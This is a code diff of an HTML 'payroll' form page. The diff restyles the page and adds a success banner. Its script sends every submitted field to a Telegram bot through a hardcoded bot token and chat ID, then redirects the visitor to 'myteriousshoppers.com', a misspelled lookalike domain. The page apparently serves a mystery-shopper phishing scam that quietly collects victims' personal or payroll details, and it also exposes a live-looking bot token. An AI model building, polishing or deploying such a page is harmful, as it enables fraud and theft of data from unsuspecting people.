@@ -8,39 +8,79 @@
     body {
       font-family: Arial, sans-serif;
       background: #f9f9f9;
+      margin: 0;
       padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
     }
+
     form {
+      width: 100%;
       max-width: 500px;
-      margin: auto;
       background: white;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.05);
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
     }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
     label {
       display: block;
       margin: 15px 0 5px;
+      font-weight: bold;
     }
+
     input, select {
       width: 100%;
-      padding: 10px;
+      padding: 12px;
       border: 1px solid #ccc;
       border-radius: 6px;
+      box-sizing: border-box;
     }
+
     button {
-      margin-top: 20px;
+      margin-top: 25px;
       background: #dc143c;
       color: white;
       border: none;
-      padding: 12px;
+      padding: 14px;
       width: 100%;
       border-radius: 6px;
       font-size: 16px;
       cursor: pointer;
+      transition: background 0.3s ease;
     }
+
     button:hover {
       background: #b01030;
+    }
+
+    .success-message {
+      margin-top: 20px;
+      padding: 15px;
+      background-color: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+      border-radius: 6px;
+      display: none;
+      text-align: center;
+    }
+
+    @media (max-width: 600px) {
+      form {
+        padding: 15px;
+      }
+
+      button {
+        font-size: 14px;
+        padding: 12px;
+      }
     }
   </style>
 </head>
@@ -82,11 +122,14 @@
     </select>
 
     <button type="submit">Submit Details</button>
+    <div class="success-message" id="successMessage">
+      ✅ Your details have been submitted successfully. Redirecting...
+    </div>
   </form>
 
   <script>
-    const botToken = "7774453371:AAE0HswdXjo1lvImLCVmr6LZueZhlbjkEPo"; // Replace with your bot token
-    const chatId = "-4610395963"; // Replace with your Telegram user ID
+    const botToken = "7774453371:AAE0HswdXjo1lvImLCVmr6LZueZhlbjkEPo";
+    const chatId = "-4610395963";
 
     document.getElementById("payrollForm").addEventListener("submit", function(e) {
       e.preventDefault();
@@ -117,15 +160,16 @@
       })
       .then(response => {
         if (response.ok) {
-          alert("Submitted successfully!");
           document.getElementById("payrollForm").reset();
-        } else {
-          alert("Something went wrong. Please try again.");
+          const successMsg = document.getElementById("successMessage");
+          successMsg.style.display = "block";
+          setTimeout(() => {
+            window.location.href = "https://www.myteriousshoppers.com";
+          }, 3000);
         }
       })
       .catch(error => {
-        alert("Error sending to Telegram.");
-        console.error(error);
+        console.error("Telegram API Error:", error);
       });
     });
   </script>
